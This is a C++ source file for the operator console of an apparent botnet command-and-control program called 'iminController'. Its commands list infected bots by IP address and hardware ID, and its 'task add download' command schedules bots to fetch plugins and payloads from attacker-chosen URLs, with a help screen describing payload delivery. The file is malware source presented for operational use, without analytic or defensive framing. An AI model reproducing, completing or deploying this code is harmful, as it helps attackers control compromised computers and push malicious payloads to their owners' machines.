#include "CommandHandler.h"

std::vector<std::string> CommandHandler::splitCommand(std::string Command,
                                                      char Delimiter) {
  std::vector<std::string> split;
  std::stringstream stream(Command);
  std::string buffer;

  while (std::getline(stream, buffer, Delimiter)) {
    split.push_back(buffer);
  }

  return split;
}
int CommandHandler::checkCommand() {
  SplittedCommand = splitCommand(RawCommand, L' ');
  if (SplittedCommand[0] == "list") {
    return 0;
  } else if (SplittedCommand[0] == "task") {
    return 0;
  } else if (SplittedCommand[0] == "help") {
    return 0;
  } else {
    return -1;
  }
}

int CommandHandler::executeCommand() {
  if (SplittedCommand[0] == "list" && SplittedCommand.size() == 1) {
    int i = 1;
    for (auto iter = BotHandler::getInstance()->getBotListIteratorBegin();
         iter != BotHandler::getInstance()->getBotListIteratorEnd(); iter++) {
      printf("#%d IP: %s HWID: %s\n", i, (iter->second)->getBotIP().c_str(),
             (iter->second)->getHWID().c_str());
      i += 1;
    }

    return 0;
  } else if (SplittedCommand[0] == "task") {
    if (SplittedCommand.size() >= 4 && SplittedCommand.size() <= 8) {
      if (SplittedCommand[1] == "add") {
        Task *task = new Task(Variable::TaskType::LOAD_PLUGIN);

        if (SplittedCommand[2] == "download") {
          task->setTaskPeriod(atoi(SplittedCommand[3].c_str()));
          task->setTaskParam_1((char *)SplittedCommand[4].c_str());
          //task->setTaskParam_2((char *)SplittedCommand[5].c_str());

          TaskHandler::getInstance()->addTask(task);

          return 0;
        } else {
          delete task;
          return -1;
        }
      } else {
        return -1;
      }
    } else if (SplittedCommand.size() == 3) {
      if (SplittedCommand[1] == "remove") {
        TaskHandler::getInstance()->removeTask(std::stoi(SplittedCommand[2]));

        return 0;
      } else {
        return -1;
      }
    } else if (SplittedCommand.size() == 2) {
      if (SplittedCommand[1] == "list") {
        for (auto iter = TaskHandler::getInstance()->getTaskPoolIteratorBegin();
             iter != TaskHandler::getInstance()->getTaskPoolIteratorEnd();
             iter++) {
          printf("task_num: %d task_period: %d task_param_1: %s task_param_2: "
                 "%s\n",
                 iter->first, iter->second->getTaskPeriodAsMinute(),
                 iter->second->getTaskParam_1(),
                 iter->second->getTaskParam_2());
        }
        return 0;
      } else {
        return -1;
      }
    } else {
      return -1;
    }
  } else if (SplittedCommand[0] == "help") {
    wprintf(L"iminController Commands:\n");
    wprintf(L"===================================================\n");
    wprintf(L"help - What you just wrote ;)\n");
    wprintf(L"\ntask - Manage task(download payload... etc)\n");
    wprintf(L"   task add [plugin:download] [period] [plugin_url] [payload_url]"
            L" [param3] [param4] - Add "
            L"download task.\n");
    wprintf(L"   task remove [task_num:523] - Remove task.\n");
    wprintf(L"   task list - Show task list.\n");
    wprintf(L"\nlist - List of bots.\n");
    wprintf(L"===================================================\n");

    return 0;
  } else {
    return -1;
  }
}
